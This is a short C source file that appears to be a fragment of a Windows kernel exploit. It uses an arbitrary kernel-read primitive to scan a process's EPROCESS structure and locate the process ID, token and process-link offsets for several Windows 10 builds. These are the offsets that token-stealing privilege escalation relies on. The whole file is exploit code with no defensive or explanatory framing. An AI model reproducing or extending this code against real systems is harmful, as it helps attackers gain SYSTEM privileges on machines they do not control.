#include <windows.h>
#include <stdio.h>
#include "helper.h"
int ab_read(void* addr, void* dst, int size);
int locate_exp_offset(void* eprocess, ULONG* process_id_offset, ULONG* token_offset, ULONG* link_offset) {
	DWORD self_id = GetCurrentProcessId();
	char buffer[0x1000];
	ab_read(eprocess, buffer, sizeof(buffer));
	ULONGLONG* ptr = (ULONGLONG*)buffer;
	*process_id_offset = 0;
	*token_offset = 0;
	*link_offset = 0;
	for (int i = 0; i < sizeof(buffer); i += 8) {
		if (*(ULONGLONG*)&buffer[i] == self_id) {
			*process_id_offset = i;
			break;
		}
	}
	switch (*process_id_offset) {
	case 0x440:
		//Windows10 20H1
		//Windows10 20H2
		//Windows10 21H1
		*token_offset = 0x4b8;
		*link_offset = 0x448;
		break;
	case 0x2e8:
		//Windows10 19H2
		//Windows10 19H1
		*token_offset = 0x360;
		*link_offset = 0x2f0;
		break;
	default:
		DEBUG("can't find os version\n");
		return 1;
	}
	return 0;
}

